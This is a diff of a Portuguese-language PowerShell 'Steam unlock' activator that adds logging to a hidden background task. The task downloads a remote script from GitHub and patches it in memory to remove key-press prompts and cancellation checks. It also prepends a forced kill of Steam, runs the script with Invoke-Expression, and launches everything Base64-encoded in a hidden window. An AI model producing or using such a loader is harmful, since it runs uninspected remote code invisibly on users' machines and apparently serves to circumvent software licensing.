@@ -22,41 +22,53 @@ try {
         # Mensagem de sucesso
         [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")
 
-        # Comando de fundo (Instalação + Warning + Notepad)
+        # Comando de fundo (Instalação + Log + Warning + Notepad)
         $bgTask = @"
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        
+        # Define o caminho do log na pasta Temp do Windows
+        `$logPath = "`$env:TEMP\SteamAtivador_Log.txt"
+        
+        # Inicia a gravação de TUDO que acontecer no PowerShell invisível
+        Start-Transcript -Path `$logPath -Force
+        
         try {
+            Write-Output "Iniciando processo de instalacao invisivel..."
+            
             # Baixa o script da Steam original como texto
             `$s = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
+            Write-Output "Script base baixado com sucesso."
             
-            # --- O SEGREDO ESTÁ AQUI: EDIÇÃO AVANÇADA NA MEMÓRIA ---
-            
-            # 1. Zera o timer do Millennium (Muda a variavel de 5 para 0 segundos)
+            # --- EDIÇÃO AVANÇADA NA MEMÓRIA ---
             `$s = `$s -replace '\`$milleniumTimer\s*=\s*5', '`$milleniumTimer = 0'
-            
-            # 2. Oblitera qualquer exigência de apertar tecla (ReadKey) ignorando espaços
             `$s = `$s -replace '\[void\]\s*\[System\.Console\]::ReadKey\([^)]*\)', ''
             `$s = `$s -replace '\[System\.Console\]::ReadKey\([^)]*\)', ''
-            
-            # 3. Engana o script para achar que NENHUMA tecla foi pressionada para cancelar
             `$s = `$s -replace '\[Console\]::KeyAvailable', '`$false'
-            
-            # 4. GATILHO OCULTO: Força a Steam e seus sub-processos a fecharem! 
-            # Isso evita o erro de "Acesso Negado" que fazia o download pular a etapa.
             `$s = "taskkill /F /IM steam.exe /T 2> `$null; " + `$s
 
-            # Agora executa o script modificado e implacável na memória
+            Write-Output "Script modificado na memoria. Executando instalacao..."
+            
+            # Executa o script modificado
             Invoke-Expression `$s
+
+            Write-Output "Instalacao do script principal concluida."
 
             # Baixa o aviso e abre no notepad
             `$wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
             `$path = "`$env:TEMP\warning.txt"
             (New-Object System.Net.WebClient).DownloadFile(`$wUrl, `$path)
             Start-Process notepad.exe `$path
-        } catch {}
+            Write-Output "Aviso final exibido ao usuario."
+            
+        } catch {
+            Write-Error "ERRO FATAL DURANTE A EXECUÇÃO: `$(`$_.Exception.Message)"
+        } finally {
+            # Encerra a gravação do log, independente de dar erro ou sucesso
+            Stop-Transcript
+        }
 "@
 
-        # Conversão para Base64 para execução limpa no background
+        # Conversão para Base64
         $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
         
         # Inicia o processo totalmente oculto
